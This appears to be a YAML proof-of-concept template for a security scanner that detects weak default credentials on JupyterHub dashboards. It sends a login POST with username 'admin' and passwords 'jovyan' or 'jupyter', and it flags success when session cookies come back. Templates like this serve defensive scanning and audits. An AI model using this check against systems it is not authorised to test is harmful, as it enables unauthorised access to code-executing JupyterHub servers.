id: poc-yaml-jupyterhub-dashboard-weak-password
info:
  name: JupyterHub Dashboard 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: JupyterHub
  osprey-id: vb_2022_0069
variables:
  r_username: admin
  r_password: 'jovyan

    jupyter'
requests:
- method: POST
  path: /hub/login?next=
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username={{.r_username}}&password={{.r_password}}
  expression: 'contains(headers, "jupyterhub-session-id=") && contains(headers, "jupyterhub-hub-login=")

    '
transport: http
